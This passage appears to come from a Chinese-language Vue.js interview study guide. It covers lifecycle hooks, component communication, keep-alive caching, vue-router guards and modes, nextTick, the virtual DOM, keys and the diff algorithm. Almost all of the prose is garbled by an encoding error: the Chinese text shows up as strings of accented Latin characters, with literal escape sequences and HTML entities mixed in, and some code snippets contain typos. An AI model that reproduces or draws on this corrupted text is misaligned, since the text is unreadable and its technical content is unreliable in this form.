æ™‚èª¿ç”¨ï¼Œç™¼ç”Ÿåœ¨è™›æ“¬DOMæ‰“è£œä¸ä¹‹å‰ï¼Œé©åˆåœ¨æ›´æ–°ä¹‹å‰è¨ªå•ç¾æœ‰çš„DOMï¼Œæ¯”å¦‚æ‰‹å‹•ç§»é™¤å·²æ·»åŠ çš„äº‹ä»¶ç›£è½å™¨ã€‚\nèªªæ˜ï¼šå¯ä»¥åœ¨ç•¶å‰éšæ®µé€²è¡Œæ›´æ”¹æ•¸æ“šï¼Œä¸æœƒé€ æˆé‡æ¸²æŸ“ã€‚\nupdatedéšæ®µï¼šè™›æ“¬DOMé‡æ–°æ¸²æŸ“å’Œæ‰“è£œä¸ä¹‹å¾Œèª¿ç”¨ï¼Œçµ„æˆæ–°çš„DOMå·²ç¶“æ›´æ–°ï¼Œé¿å…åœ¨é€™å€‹é‰¤å­å‡½æ•¸ä¸­æ“ä½œæ•¸æ“šï¼Œé˜²æ­¢æ­»å¾ªç’°ã€‚\nèªªæ˜ï¼šç•¶å‰éšæ®µçµ„ä»¶Domå·²å®Œæˆæ›´æ–°ã€‚è¦æ³¨æ„çš„æ˜¯é¿å…åœ¨æ­¤æœŸé–“æ›´æ”¹æ•¸æ“šï¼Œå› ç‚ºé€™å¯èƒ½æœƒå°è‡´ç„¡é™å¾ªç’°çš„æ›´æ–°ã€‚\néŠ·æ¯€å‰/å¾Œï¼š\nbeforeDestroyéšæ®µï¼šå¯¦ä¾‹éŠ·æ¯€å‰èª¿ç”¨ï¼Œå¯¦ä¾‹é‚„å¯ä»¥ç”¨ï¼Œthisèƒ½ç²å–åˆ°å¯¦ä¾‹ï¼Œå¸¸ç”¨æ–¼éŠ·æ¯€å®šæ™‚å™¨ï¼Œè§£ç¶äº‹ä»¶ã€‚\nèªªæ˜ï¼šåœ¨ç•¶å‰éšæ®µå¯¦ä¾‹å®Œå…¨å¯ä»¥è¢«ä½¿ç”¨ï¼Œæˆ‘å€‘å¯ä»¥åœ¨é€™æ™‚é€²è¡Œå–„å¾Œæ”¶å°¾å·¥ä½œï¼Œæ¯”å¦‚æ¸…é™¤è¨ˆæ™‚å™¨ã€‚\ndestroyedéšæ®µï¼šå¯¦ä¾‹éŠ·æ¯€å¾Œèª¿ç”¨ï¼Œèª¿ç”¨å¾Œæ‰€æœ‰äº‹ä»¶ç›£è½å™¨æœƒè¢«ç§»é™¤ï¼Œæ‰€æœ‰çš„å­å¯¦ä¾‹éƒ½æœƒè¢«éŠ·æ¯€ã€‚\nèªªæ˜ï¼šç•¶å‰éšæ®µçµ„ä»¶å·²è¢«æ‹†è§£ï¼Œæ•¸æ“šç¶å®šè¢«å¸é™¤ï¼Œç›£è½è¢«ç§»å‡ºï¼Œå­å¯¦ä¾‹ä¹Ÿçµ±çµ±è¢«éŠ·æ¯€ã€‚\nè£œå……ï¼š\nç¬¬ä¸€æ¬¡é é¢åŠ è¼‰æ™‚æœƒè§¸ç™¼ï¼šbeforeCreate, created, beforeMount, mountedã€‚\ncreated å¯¦ä¾‹å·²ç¶“å‰µå»ºå®Œæˆï¼Œå› ç‚ºå®ƒæ˜¯æœ€æ—©è§¸ç™¼çš„åŸå› å¯ä»¥é€²è¡Œä¸€äº›æ•¸æ“šï¼Œè³‡æºçš„è«‹æ±‚ã€‚ (æœå‹™å™¨æ¸²æŸ“æ”¯æŒcreatedæ–¹æ³•) mounted å¯¦ä¾‹å·²ç¶“æ›è¼‰å®Œæˆï¼Œå¯ä»¥é€²è¡Œä¸€äº›DOMæ“ä½œã€‚ (æ¥å£è«‹æ±‚) ç”Ÿå‘½é€±æœŸé‰¤å­æ˜¯å¦‚ä½•å¯¦ç¾çš„ï¼Ÿ Vueçš„ç”Ÿå‘½é€±æœŸé‰¤å­å°±æ˜¯å›èª¿å‡½æ•¸è€Œå·²ï¼Œç•¶å‰µå»ºçµ„ä»¶å¯¦ä¾‹çš„éç¨‹ä¸­æœƒèª¿ç”¨å°æ‡‰çš„é‰¤å­æ–¹æ³•ã€‚ è£œå……ï¼š\nå…§éƒ¨ä¸»è¦æ˜¯ä½¿ç”¨callHookæ–¹æ³•ä¾†èª¿ç”¨å°æ‡‰çš„æ–¹æ³•ã€‚æ ¸å¿ƒæ˜¯ä¸€å€‹ç™¼å¸ƒè¨‚é–±æ¨¡å¼ï¼Œå°‡é‰¤å­è¨‚é–±å¥½(å…§éƒ¨æ¡ç”¨æ•¸çµ„çš„æ–¹å¼å­˜å„²)ï¼Œåœ¨å°æ‡‰çš„éšæ®µé€²è¡Œç™¼å¸ƒã€‚\nVue çš„çˆ¶çµ„ä»¶å’Œå­çµ„ä»¶ç”Ÿå‘½é€±æœŸé‰¤å­åŸ·è¡Œé †åº ç¬¬ä¸€æ¬¡é é¢åŠ è¼‰æ™‚æœƒè§¸ç™¼ beforeCreate, created, beforeMount, mounted é€™å¹¾å€‹é‰¤å­ã€‚ æ¸²æŸ“éç¨‹ï¼š çˆ¶çµ„ä»¶æ›è¼‰å®Œæˆä¸€å®šæ˜¯ç­‰å­çµ„ä»¶éƒ½æ›è¼‰å®Œæˆå¾Œï¼Œæ‰ç®—æ˜¯çˆ¶çµ„ä»¶æ›è¼‰å®Œï¼Œæ‰€ä»¥çˆ¶çµ„ä»¶çš„mountedåœ¨å­çµ„ä»¶moutedä¹‹å¾Œ\nçˆ¶beforeCreate â¡ çˆ¶created â¡ çˆ¶beforeMount â¡ å­beforeCreate â¡ å­created â¡ å­beforeMount â¡ å­mounted â¡ çˆ¶mounted\nå­çµ„ä»¶æ›´æ–°éç¨‹ï¼š å½±éŸ¿åˆ°çˆ¶çµ„ä»¶ï¼šçˆ¶beforeUpdate -\u0026gt; å­beforeUpdate-\u0026gt;å­updated -\u0026gt; çˆ¶updted\nä¸å½±éŸ¿çˆ¶çµ„ä»¶ï¼šå­beforeUpdate -\u0026gt; å­updated\nçˆ¶çµ„ä»¶æ›´æ–°éç¨‹ï¼š å½±éŸ¿åˆ°å­çµ„ä»¶ï¼šçˆ¶beforeUpdate -\u0026gt; å­beforeUpdate-\u0026gt;å­updated -\u0026gt; çˆ¶updted\nä¸å½±éŸ¿å­çµ„ä»¶ï¼šçˆ¶beforeUpdate -\u0026gt; çˆ¶updated\néŠ·æ¯€éç¨‹ï¼š çˆ¶beforeDestroy -\u0026gt; å­beforeDestroy -\u0026gt; å­destroyed -\u0026gt; çˆ¶destroyed\né‡è¦ï¼šçˆ¶çµ„ä»¶ç­‰å¾…å­çµ„ä»¶å®Œæˆå¾Œï¼Œæ‰æœƒåŸ·è¡Œè‡ªå·±å°æ‡‰å®Œæˆçš„é‰¤å­ã€‚\nçµ„ä»¶é€šä¿¡ç¯‡ Vueä¸­çš„çµ„ä»¶çš„data ç‚ºä»€éº¼æ˜¯ä¸€å€‹å‡½æ•¸ï¼Ÿ æ¯æ¬¡ä½¿ç”¨çµ„ä»¶æ™‚éƒ½æœƒå°çµ„ä»¶é€²è¡Œå¯¦ä¾‹åŒ–æ“ä½œï¼Œä¸¦ä¸”èª¿ç”¨dataå‡½æ•¸è¿”å›ä¸€å€‹å°åƒä½œç‚ºçµ„ä»¶çš„æ•¸æ“šæºã€‚é€™æ¨£å¯ä»¥ä¿è­‰å¤šå€‹çµ„ä»¶é–“æ•¸æ“šäº’ä¸å½±éŸ¿ã€‚ å¦‚æœdataæ˜¯å°è±¡çš„è©±ï¼Œå°è±¡å±¬æ–¼å¼•ç”¨é¡å‹ï¼Œæœƒå½±éŸ¿åˆ°æ‰€æœ‰çš„å¯¦ä¾‹ã€‚æ‰€ä»¥ç‚ºäº†ä¿è­‰çµ„ä»¶ä¸åŒçš„å¯¦ä¾‹ä¹‹é–“dataä¸è¡çªï¼Œdataå¿…é ˆæ˜¯ä¸€å€‹å‡½æ•¸ã€‚ Vue çµ„ä»¶é–“é€šä¿¡æœ‰å“ªå¹¾ç¨®æ–¹å¼ï¼Ÿ Vue çµ„ä»¶é–“é€šä¿¡åªè¦æŒ‡ä»¥ä¸‹ 3 é¡é€šä¿¡ï¼šçˆ¶å­çµ„ä»¶é€šä¿¡ã€éš”ä»£çµ„ä»¶é€šä¿¡ã€å…„å¼Ÿçµ„ä»¶é€šä¿¡ï¼Œä¸‹é¢æˆ‘å€‘åˆ†åˆ¥ä»‹ç´¹æ¯ç¨®é€šä¿¡æ–¹å¼ä¸”æœƒèªªæ˜æ­¤ç¨®æ–¹æ³•å¯é©ç”¨æ–¼å“ªé¡çµ„ä»¶é–“é€šä¿¡ã€‚ props / $emit é©ç”¨çˆ¶å­çµ„ä»¶é€šä¿¡\né€™ç¨®æ–¹æ³•æ˜¯ Vue çµ„ä»¶çš„åŸºç¤ï¼Œç›¸ä¿¡å¤§éƒ¨åˆ†åŒå­¸è€³èèƒ½è©³ï¼Œæ‰€ä»¥æ­¤è™•å°±ä¸èˆ‰ä¾‹å±•é–‹ä»‹ç´¹ã€‚ ref èˆ‡ $parent / childrené€‚ç”¨çˆ¶å­ç»„ä»¶é€šä¿¡\nrefï¼šå¦‚æœåœ¨æ™®é€šçš„DOMå…ƒç´ ä¸Šä½¿ç”¨ï¼Œå¼•ç”¨æŒ‡å‘çš„å°±æ˜¯DOMå…ƒç´ ï¼›å¦‚æœç”¨åœ¨å­çµ„ä»¶ä¸Šï¼Œå¼•ç”¨å°±æŒ‡å‘çµ„ä»¶å¯¦ä¾‹ parent / $childrenï¼šè¨ªå•çˆ¶ / å­å¯¦ä¾‹ EventBus ï¼ˆ$emit / $onï¼‰ é©ç”¨æ–¼ çˆ¶å­ã€éš”ä»£ã€å…„å¼Ÿçµ„ä»¶é€šä¿¡\né€™ç¨®æ–¹æ³•é€šéä¸€å€‹ç©ºçš„ Vue å¯¦ä¾‹ä½œç‚ºä¸­å¤®äº‹ä»¶ç¸½ç·šï¼ˆäº‹ä»¶ä¸­å¿ƒï¼‰ï¼Œç”¨å®ƒä¾†è§¸ç™¼äº‹ä»¶å’Œç›£è½äº‹ä»¶ï¼Œå¾è€Œå¯¦ç¾ä»»ä½•çµ„ä»¶é–“çš„é€šä¿¡ï¼ŒåŒ…æ‹¬çˆ¶å­ã€éš”ä»£ã€å…„å¼Ÿçµ„ä»¶ã€‚ attrs / listeners é©ç”¨æ–¼éš”ä»£çµ„ä»¶é€šä¿¡\nattrsï¼šåŒ…å«äº†çˆ¶ä½œç”¨åŸŸä¸­ä¸è¢«propæ‰€è­˜åˆ¥(ä¸”ç²å–)çš„ç‰¹æ€§ç¶å®š(classå’Œstyleé™¤å¤–)ã€‚ç•¶ä¸€å€‹çµ„ä»¶æ²’æœ‰è²æ˜ä»»ä½•propæ™‚ï¼Œé€™è£¡æœƒåŒ…å«æ‰€æœ‰çˆ¶ä½œç”¨åŸŸçš„ç¶å®š(classå’Œstyleé™¤å¤–)ï¼Œä¸¦ä¸”å¯ä»¥é€šévâˆ’bind=\u0026ldquo;attrs\u0026rdquo; å‚³å…¥å…§éƒ¨çµ„ä»¶ã€‚é€šå¸¸é…åˆ inheritAttrs é¸é …ä¸€èµ·ä½¿ç”¨ã€‚ listenersï¼šåŒ…å«äº†çˆ¶ä½œç”¨åŸŸä¸­çš„(ä¸å«.nativeä¿®é£¾å™¨çš„) v-onäº‹ä»¶ç›£è½å™¨ã€‚å®ƒå¯ä»¥é€šévâˆ’on=\u0026ldquo;listeners\u0026rdquo; å‚³å…¥å…§éƒ¨çµ„ä»¶ provide / inject é©ç”¨æ–¼éš”ä»£çµ„ä»¶é€šä¿¡\nç¥–å…ˆçµ„ä»¶ä¸­é€šé provider ä¾†æä¾›è®Šé‡ï¼Œç„¶å¾Œåœ¨å­å­«çµ„ä»¶ä¸­é€šé inject ä¾†æ³¨å…¥è®Šé‡ã€‚ provide / inject API ä¸»è¦è§£æ±ºäº†è·¨ç´šçµ„ä»¶é–“çš„é€šä¿¡å•é¡Œï¼Œä¸éå®ƒçš„ä½¿ç”¨å ´æ™¯ï¼Œä¸»è¦æ˜¯å­çµ„ä»¶ç²å–ä¸Šç´šçµ„ä»¶çš„ç‹€æ…‹ï¼Œè·¨ç´šçµ„ä»¶é–“å»ºç«‹äº†ä¸€ç¨®ä¸»å‹•æä¾›èˆ‡ä¾è³´æ³¨å…¥çš„é—œä¿‚ã€‚ Vuex é©ç”¨æ–¼ çˆ¶å­ã€éš”ä»£ã€å…„å¼Ÿçµ„ä»¶é€šä¿¡\nVuex æ˜¯ä¸€å€‹å°ˆç‚º Vue.js æ‡‰ç”¨ç¨‹åºé–‹ç™¼çš„ç‹€æ…‹ç®¡ç†æ¨¡å¼ã€‚æ¯ä¸€å€‹ Vuex æ‡‰ç”¨çš„æ ¸å¿ƒå°±æ˜¯ storeï¼ˆå€‰åº«ï¼‰ã€‚ \u0026ldquo;store\u0026rdquo; åŸºæœ¬ä¸Šå°±æ˜¯ä¸€å€‹å®¹å™¨ï¼Œå®ƒåŒ…å«è‘—ä½ çš„æ‡‰ç”¨ä¸­å¤§éƒ¨åˆ†çš„ç‹€æ…‹ (state)ã€‚ çµ„ä»¶ä¸­å¯« nameé¸é …æœ‰å“ªäº›å¥½è™•åŠä½œç”¨ï¼Ÿ å¯ä»¥é€šéåå­—æ‰¾åˆ°å°æ‡‰çš„çµ„ä»¶ï¼ˆéæ­¸çµ„ä»¶ï¼‰ å¯ä»¥é€šénameå±¬æ€§å¯¦ç¾ç·©å­˜åŠŸèƒ½ (keep-alive) å¯ä»¥é€šénameä¾†è­˜åˆ¥çµ„ä»¶ï¼ˆè·¨ç´šçµ„ä»¶é€šä¿¡æ™‚éå¸¸é‡è¦ï¼‰ 1 2 3 4 5 Vue.extend = function () { if(name) { Sub.options.componentd[name] = Sub } } keep-aliveå¹³æ™‚åœ¨å“ªè£¡ä½¿ç”¨ï¼ŸåŸç†æ˜¯ï¼Ÿ keep-alive ä¸»è¦æ˜¯çµ„ä»¶ç·©å­˜ï¼Œæ¡ç”¨çš„æ˜¯LRUç®—æ³•ã€‚æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨æ³•ã€‚ å¸¸ç”¨çš„å…©å€‹å±¬æ€§include/excludeï¼Œå…è¨±çµ„ä»¶æœ‰æ¢ä»¶çš„é€²è¡Œç·©å­˜ã€‚ å…©å€‹ç”Ÿå‘½é€±æœŸactivated/deactivatedï¼Œç”¨ä¾†å¾—çŸ¥ç•¶å‰çµ„ä»¶æ˜¯å¦è™•æ–¼æ´»èºç‹€æ…‹ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 abstract: true, // æŠ½è±¡çµ„ä»¶ props:{ include: patternTypes, // è¦ç·©å­˜çš„æœ‰å“ªäº› exclude: patternTypes, // è¦æ’é™¤çš„æœ‰å“ªäº› max: [String, Number] //æœ€å¤§ç·©å­˜æ•¸é‡ } if(cache[key]) { // é€šékey æ‰¾åˆ°ç·©å­˜ï¼Œç²å–å¯¦ä¾‹ vnode.componentInstance = cache[key].componentInstance remove(keys, key) //å°‡keyåˆªé™¤æ‰ keys.push(key) // æ”¾åˆ°æœ«å°¾ } else { cache[key] = vnode // æ²’æœ‰ç·©å­˜é keys.push(key) //å­˜å„²key if(this.max \u0026amp;\u0026amp; keys.length \u0026gt; parseInt(this.max)) { // å¦‚æœè¶…éæœ€å¤§ç·©å­˜æ•¸ // åˆªé™¤æœ€æ—©ç·©å­˜çš„ pruneCacheEntry(cache, keys[0], keys, this._vnode) } } vnode.data.keepAlive = true // æ¨™è¨˜èµ°äº†ç·©å­˜ Vue.minxinçš„ä½¿ç”¨å ´æ™¯å’ŒåŸç†ï¼Ÿ Vue.mixinçš„ä½œç”¨å°±æ˜¯æŠ½é›¢å…¬å…±çš„æ¥­å‹™é‚è¼¯ï¼ŒåŸç†é¡ä¼¼\u0026quot;å°è±¡çš„ç¹¼æ‰¿\u0026quot;ï¼Œç•¶çµ„ä»¶åˆå§‹åŒ–æ™‚æœƒèª¿ç”¨ mergeOptionsæ–¹æ³•é€²è¡Œåˆä½µï¼Œæ¡ç”¨ç­–ç•¥æ¨¡å¼é‡å°ä¸åŒçš„å±¬æ€§é€²è¡Œåˆä½µï¼Œå¦‚æœæ··å…¥çš„æ•¸æ“šå’Œæœ¬èº«çµ„ä»¶ä¸­çš„æ•¸æ“šè¡çªï¼Œæœƒæ¡ç”¨\u0026quot;å°±è¿‘åŸå‰‡\u0026quot;ä»¥çµ„ä»¶çš„æ•¸æ“šç‚ºæº–ã€‚ è£œå……ï¼š\nmixinä¸­æœ‰å¾ˆå¤šç¼ºé™·\u0026quot;å‘½åè¡çªå•é¡Œ\u0026quot;ã€\u0026ldquo;ä¾è³´å•é¡Œ\u0026rdquo;ã€\u0026ldquo;æ•¸æ“šä¾†æºå•é¡Œ\u0026rdquo;ï¼Œé€™è£¡å¼·èª¿ä¸€ä¸‹mixinçš„æ•¸æ“šæ˜¯ä¸æœƒè¢«å…±äº«çš„ã€‚\nè·¯ç”±ç¯‡ Vue-routeræœ‰å¹¾ç¨®é‰¤å­å‡½æ•¸ï¼Ÿå…·é«”æ˜¯ä»€éº¼åŠåŸ·è¡Œæµç¨‹æ˜¯æ€æ¨£çš„ï¼Ÿ è·¯ç”±é‰¤å­çš„åŸ·è¡Œæµç¨‹ï¼Œé‰¤å­å‡½æ•¸ç¨®é¡æœ‰ï¼šå…¨å±€å®ˆè¡›ã€è·¯ç”±å®ˆè¡›ã€çµ„ä»¶å®ˆè¡›ã€‚ å®Œæ•´çš„å°èˆªè§£ææµç¨‹ å°èˆªè¢«è§¸ç™¼ åœ¨å¤±æ´»çš„çµ„ä»¶è£¡èª¿ç”¨beforeRouteLeaveå®ˆè¡› èª¿ç”¨å…¨å±€beforeEachå®ˆè¡› åœ¨å¾©ç”¨çµ„ä»¶è£¡èª¿ç”¨beforeRouteUpdateå®ˆè¡› èª¿ç”¨è·¯ç”±é…ç½®è£¡çš„beforeEnterå®ˆè¡› è§£æç•°æ­¥è·¯ç”±çµ„ä»¶ åœ¨è¢«æ¿€æ´»çš„çµ„ä»¶è£¡èª¿ç”¨beforeRouteEnterå®ˆè¡› èª¿ç”¨å…¨å±€beforeResolveå®ˆè¡› å°èˆªè¢«ç¢ºèª èª¿ç”¨å…¨å±€çš„afterEaché‰¤å­ DOMæ›´æ–° ç”¨å‰µå»ºå¥½çš„å¯¦ä¾‹èª¿ç”¨beforeRouteEnterå®ˆè¡›ä¸­å‚³çµ¦nextçš„å›èª¿å‡½æ•¸ vue-router å…©ç¨®æ¨¡å¼çš„å€åˆ¥ï¼Ÿ vue-router æœ‰ 3 ç¨®è·¯ç”±æ¨¡å¼ï¼šhashã€historyã€abstractã€‚ hashæ¨¡å¼ï¼šhash + hashChange\nç‰¹é»ï¼šhashé›–ç„¶åœ¨URLä¸­ï¼Œä½†ä¸è¢«åŒ…æ‹¬åœ¨HTTPè«‹æ±‚ä¸­ï¼›ç”¨ä¾†æŒ‡å°ç€è¦½å™¨å‹•ä½œï¼Œå°æœå‹™ç«¯å®‰å…¨ç„¡ç”¨ï¼Œhashä¸æœƒé‡åŠ è¼‰é é¢ã€‚é€šéç›£è½ hashï¼ˆ#ï¼‰çš„è®ŠåŒ–ä¾†åŸ·è¡Œjsä»£ç¢¼ å¾è€Œå¯¦ç¾ é é¢çš„æ”¹è®Šã€‚\næ ¸å¿ƒä»£ç ï¼š\n1 2 3 window.addEventListener(â€˜hashchangeâ€˜,function(){ self.urlChange() }) historyæ¨¡å¼ï¼šhistoryApi + popState\nHTML5æ¨å‡ºçš„history APIï¼Œç”±pushState()è¨˜éŒ„æ“ä½œæ­·å²ï¼Œç›£è½popstateäº‹ä»¶ä¾†ç›£è½åˆ°ç‹€æ…‹è®Šæ›´ã€‚\nå› ç‚ºåªè¦åˆ·æ–°é€™å€‹url(www.ff.ff/jjkj/fdfd/fdf/fd)å°±æœƒè«‹æ±‚æœå‹™å™¨ï¼Œç„¶è€Œæœå‹™å™¨ä¸Šæ ¹æœ¬æ²’æœ‰é€™å€‹è³‡æºï¼Œæ‰€ä»¥å°±æœƒå ±404ï¼Œè§£æ±ºæ–¹æ¡ˆå°±é…ç½®ä¸€ä¸‹æœå‹™å™¨ç«¯ã€‚\nèªªæ˜ï¼š\n1. hash: ä½¿ç”¨ URL hash å€¼ä¾†ä½œè·¯ç”±ã€‚æ”¯æŒæ‰€æœ‰ç€è¦½å™¨ï¼ŒåŒ…æ‹¬ä¸æ”¯æŒ HTML5 History Api çš„ç€è¦½å™¨\n2. history : ä¾è³´ HTML5 History API å’Œæœå‹™å™¨é…ç½®ã€‚å…·é«”å¯ä»¥æŸ¥çœ‹ HTML5 History æ¨¡å¼\n3. abstract : æ”¯æŒæ‰€æœ‰ JavaScript é‹è¡Œç’°å¢ƒï¼Œå¦‚ Node.js æœå‹™å™¨ç«¯ã€‚å¦‚æœç™¼ç¾æ²’æœ‰ç€è¦½å™¨çš„ APIï¼Œè·¯ç”±æœƒè‡ªå‹•å¼·åˆ¶é€²å…¥é€™å€‹æ¨¡å¼\nå±¬æ€§ä½œç”¨èˆ‡å°æ¯”ç¯‡ nextTickåœ¨å“ªè£¡ä½¿ç”¨ï¼ŸåŸç†æ˜¯ï¼Ÿ nextTickçš„å›èª¿æ˜¯åœ¨ä¸‹æ¬¡DOMæ›´æ–°å¾ªç’°çµæŸä¹‹å¾ŒåŸ·è¡Œçš„å»¶é²å›èª¿ã€‚åœ¨ä¿®æ”¹æ•¸æ“šä¹‹å¾Œç«‹å³ä½¿ç”¨é€™å€‹æ–¹æ³•ï¼Œç²å–æ›´æ–°å¾Œçš„DOMã€‚ nextTickä¸»è¦ä½¿ç”¨äº†å®ä»»å‹™å’Œå¾®ä»»å‹™ã€‚åŸç†å°±æ˜¯ç•°æ­¥æ–¹æ³•(promise, mutationObserver, setImmediate, setTimeout)ç¶“å¸¸èˆ‡äº‹ä»¶å¾ªç’°ä¸€èµ·ä¾†å•ã€‚ è£œå……ï¼š\nvueå¤šæ¬¡æ›´æ–°æ•¸æ“šï¼Œæœ€çµ‚æœƒé€²è¡Œæ‰¹è™•ç†æ›´æ–°ã€‚å…§éƒ¨èª¿ç”¨çš„å°±æ˜¯nextTickå¯¦ç¾äº†å»¶é²æ›´æ–°ï¼Œç”¨æˆ¶è‡ªå®šç¾©çš„nextTickä¸­çš„å›èª¿æœƒè¢«å»¶é²åˆ°æ›´æ–°å®Œæˆå¾Œèª¿ç”¨ï¼Œå¾è€Œå¯ä»¥ç²å–æ›´æ–°å¾Œçš„DOMã€‚\nVue ç‚ºä»€éº¼éœ€è¦è™›æ“¬DOMï¼Ÿè™›æ“¬DOMçš„å„ªåŠ£å¦‚ä½•ï¼Ÿ Virtual DOM å°±æ˜¯ç”¨jså°è±¡ä¾†æè¿°çœŸå¯¦DOMï¼Œæ˜¯å°çœŸå¯¦DOMçš„æŠ½è±¡ï¼Œç”±æ–¼ç›´æ¥æ“ä½œDOMæ€§èƒ½ä½ä½†æ˜¯jså±¤çš„æ“ä½œæ•ˆç‡é«˜ï¼Œå¯ä»¥å°‡DOMæ“ä½œè½‰åŒ–æˆå°åƒæ“ä½œï¼Œæœ€çµ‚é€šédiffç®—æ³•æ¯”å°å·®ç•°é€²è¡Œæ›´æ–°DOM(æ¸›å°‘äº†å°çœŸå¯¦DOMçš„æ“ä½œ)ã€‚è™›æ“¬DOMä¸ä¾è³´çœŸå¯¦å¹³å°ç’°å¢ƒå¾è€Œä¹Ÿå¯ä»¥å¯¦ç¾è·¨å¹³å°ã€‚ è£œå……ï¼š\nè™›æ“¬DOMçš„å¯¦ç¾å°±æ˜¯æ™®é€šå°è±¡åŒ…å«tagã€dataã€childrenç­‰å±¬æ€§å°çœŸå¯¦ç¯€é»çš„æè¿°ã€‚(æœ¬è³ªä¸Šå°±æ˜¯åœ¨JSå’ŒDOMä¹‹é–“çš„ä¸€å€‹ç·©å­˜)\nVue2çš„ Virtual DOM å€Ÿé‘’äº†é–‹æºåº«snabbdomçš„å¯¦ç¾ã€‚\nVirtualDOMæ˜ å°„åˆ°çœŸå¯¦DOMè¦ç¶“æ­·VNodeçš„createã€diffã€patchç­‰éšæ®µã€‚\nVueä¸­keyçš„ä½œç”¨å’Œå·¥ä½œåŸç†ï¼Œèªªèªªä½ å°å®ƒçš„ç†è§£ ä¾‹å¦‚ï¼š 1 v-for=\u0026#34;(item, itemIndex) in tabs\u0026#34; :key=\u0026#34;itemIndex\u0026#34; keyçš„ä½œç”¨ä¸»è¦æ˜¯ç‚ºäº†é«˜æ•ˆçš„æ›´æ–°è™›æ“¬DOMï¼Œå…¶åŸç†æ˜¯vueåœ¨patchéç¨‹ä¸­é€šékeyå¯ä»¥ç²¾æº–åˆ¤æ–·å…©å€‹ç¯€é»æ˜¯å¦æ˜¯åŒä¸€å€‹ï¼Œå¾è€Œé¿å…é »ç¹æ›´æ–°ä¸åŒå…ƒç´ ï¼Œä½¿å¾—æ•´å€‹patchéç¨‹æ›´åŠ é«˜æ•ˆï¼Œæ¸›å°‘DOMæ“ä½œé‡ï¼Œæé«˜æ€§èƒ½ã€‚ è£œå……ï¼š\nè‹¥ä¸è¨­ç½®keyé‚„å¯èƒ½åœ¨åˆ—è¡¨æ›´æ–°æ™‚å¼•ç™¼ä¸€äº›éš±è”½çš„bug vueä¸­åœ¨ä½¿ç”¨ç›¸åŒæ¨™ç±¤åå…ƒç´ çš„éæ¸¡åˆ‡æ›æ™‚ï¼Œä¹Ÿæœƒä½¿ç”¨åˆ°keyå±¬æ€§ï¼Œå…¶ç›®çš„ä¹Ÿæ˜¯ç‚ºäº†è®“vueå¯ä»¥å€åˆ†å®ƒå€‘ï¼Œå¦å‰‡vueåªæœƒæ›¿æ›å…¶å…§éƒ¨å±¬æ€§è€Œä¸æœƒè§¸ç™¼éæ¸¡æ•ˆæœ Vue ä¸­çš„diffåŸç† vueçš„diffç®—æ³•æ˜¯å¹³ç´šæ¯”è¼ƒï¼Œä¸è€ƒæ…®è·¨ç´šæ¯”è¼ƒçš„æƒ…æ³ã€‚å…§éƒ¨æ¡ç”¨æ·±åº¦éæ­¸çš„æ–¹å¼ + é›™æŒ‡é‡çš„æ–¹å¼é€²è¡Œæ¯”è¼ƒã€‚ è£œå……ï¼š\nå…ˆæ¯”è¼ƒæ˜¯å¦æ˜¯ç›¸åŒç¯€é» ç›¸åŒç¯€é»æ¯”è¼ƒå±¬æ€§ï¼Œä¸¦è¤‡ç”¨è€ç¯€é» æ¯”è¼ƒå…’å­ç¯€é»ï¼Œè€ƒæ…®è€ç¯€é»å’Œæ–°ç¯€é»å…’å­çš„æƒ…æ³ å„ªåŒ–æ¯”è¼ƒï¼šé ­é ­ã€å°¾å°¾ã€é ­å°¾ã€å°¾é ­ æ¯”å°æŸ¥æ‰¾é€²è¡Œè¤‡ç”¨ Vue2 èˆ‡ Vue3.x çš„diffç®—æ³•ï¼š Vue2çš„æ ¸å¿ƒDiffç®—æ³•æ¡ç”¨äº†é›™ç«¯æ¯”è¼ƒçš„ç®—æ³•ï¼ŒåŒæ™‚å¾æ–°èˆŠchildrençš„å…©ç«¯é–‹å§‹é€²è¡Œæ¯”è¼ƒï¼Œå€ŸåŠ©keyå€¼æ‰¾åˆ°å¯è¤‡ç”¨çš„ç¯€é»ï¼Œå†é€²è¡Œç›¸é—œæ“ä½œã€‚ Vue3.xå€Ÿé‘’äº†iviç®—æ³•å’Œ infernoç®—æ³•ï¼Œè©²ç®—æ³•ä¸­é‚„é‹ç”¨äº†å‹•æ…‹è¦åŠƒçš„æ€æƒ³æ±‚è§£æœ€é•·éæ­¸å­åºåˆ—ã€‚ (å¯¦éš›çš„å¯¦ç¾å¯ä»¥çµåˆVue3.xæºç¢¼çœ‹ã€‚) v-if èˆ‡ v-forçš„å„ªå…ˆç´š v-forå„ªå…ˆæ–¼v-ifè¢«è§£æ å¦‚æœåŒæ™‚å‡ºç¾ï¼Œæ¯æ¬¡æ¸²æŸ“éƒ½æœƒå…ˆåŸ·è¡Œå¾ªç’°å†åˆ¤æ–·æ¢ä»¶ï¼Œç„¡è«–å¦‚ä½•å¾ªç’°éƒ½ä¸å¯é¿å…ï¼Œæµªè²»äº†æ€§èƒ½ è¦é¿å…å‡ºç¾é€™ç¨®æƒ…æ³ï¼Œå‰‡åœ¨å¤–å±¤åµŒå¥—templateï¼Œåœ¨é€™ä¸€å±¤é€²è¡Œv-ifåˆ¤æ–·ï¼Œç„¶å¾Œåœ¨å…§éƒ¨é€²è¡Œv-forå¾ªç’° å¦‚æœæ¢ä»¶å‡ºç¾åœ¨å¾ªç’°å…§éƒ¨ï¼Œå¯é€šéè¨ˆç®—å±¬æ€§æå‰éæ¿¾æ‰é‚£äº›ä¸éœ€è¦é¡¯ç¤ºçš„é … v-ifèˆ‡v-showçš„å€åˆ¥ v-if æ˜¯çœŸæ­£çš„æ¢ä»¶æ¸²æŸ“ï¼Œç›´åˆ°æ¢ä»¶ç¬¬ä¸€æ¬¡è®Šç‚ºçœŸæ™‚ï¼Œæ‰æœƒé–‹å§‹æ¸²æŸ“ã€‚ v-show ä¸ç®¡åˆå§‹æ¢ä»¶æ˜¯ä»€éº¼æœƒæ¸²æŸ“ï¼Œä¸¦ä¸”åªæ˜¯ç°¡å–®åœ°åŸºæ–¼ CSS çš„ â€œdisplayâ€ å±¬æ€§é€²è¡Œåˆ‡æ›ã€‚ æ³¨æ„ï¼šv-if é©ç”¨æ–¼ä¸éœ€è¦é »ç¹åˆ‡æ›æ¢ä»¶çš„å ´æ™¯ï¼›v-show å‰‡é©ç”¨æ–¼éœ€è¦éå¸¸é »ç¹åˆ‡æ›æ¢ä»¶çš„å ´æ™¯ã€‚\ncomputed å’Œ watch çš„å€åˆ¥å’Œé‹ç”¨çš„å ´æ™¯ï¼Ÿ computedï¼š 